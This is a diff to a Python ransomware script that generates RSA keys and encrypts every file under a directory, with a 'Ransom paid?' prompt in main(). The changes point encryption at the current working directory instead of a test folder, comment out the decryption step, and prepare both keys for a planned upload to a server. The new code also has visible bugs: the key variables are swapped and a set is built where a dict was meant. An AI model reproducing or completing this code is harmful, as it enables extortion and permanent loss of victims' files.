@@ -17,8 +17,13 @@ def GenerateRSAKeys():
     private_key = rsa.generate_private_key(exp,key_len, backend = default_backend())
     public_key = private_key.public_key()
 
-    WritePrivateKey(constants.RSA_PRIVATE_KEY_PATH, private_key)
-    WritePublicKey(constants.RSA_PUBLIC_KEY_PATH, public_key)
+    pubKey = WritePrivateKey(constants.RSA_PRIVATE_KEY_PATH, private_key)
+    privKey = WritePublicKey(constants.RSA_PUBLIC_KEY_PATH, public_key)
+
+    data = {"publicKey", b64encode(pubKey).decode("utf-8"),
+            "privateKey", b64encode(privKey).decode("utf-8")}
+
+    # TODO: POST data to server
 
 
 
@@ -35,6 +40,7 @@ def WritePrivateKey(filepath,key):
     file = open(constants.RSA_PRIVATE_KEY_PATH ,'wb')
     file.write(private_key)
     file.close()
+    return private_key
     
 
 
@@ -51,7 +57,7 @@ def WritePublicKey(filepath, key):
     file = open(constants.RSA_PUBLIC_KEY_PATH ,'wb')
     file.write(public_key)
     file.close()
-            
+    return public_key
 
 
 def LoadRSAPrivateKey(filepath):
@@ -88,6 +94,8 @@ def check_keys():
     If not, generates both keys
     """
     if (not os.path.isfile(constants.RSA_PRIVATE_KEY_PATH)) or (not os.path.isfile(constants.RSA_PUBLIC_KEY_PATH)):
+        if(not os.path.isdir(constants.RSA_KEYS_FOLDER)):
+            os.mkdir(constants.RSA_KEYS_FOLDER)
         GenerateRSAKeys()
 
     return
@@ -230,17 +238,17 @@ def decrypt_all_files(root):
 
 
 def main():
-    root = 'test-files/'
-    # root = os.getcwd()
+    #root = 'test-files/'
+    root = os.getcwd()
     
     enc = input('Encrypt? (y/n): ')
     if enc == 'y':
         encrypt_all_files(root)
     
-    paid = input('Ransom paid? (y/n): ')
-    # paid = 'y'
-    if paid == 'y':
-        decrypt_all_files(root)
+    # paid = input('Ransom paid? (y/n): ')
+    # # paid = 'y'
+    # if paid == 'y':
+    #     decrypt_all_files(root)
 
 
 
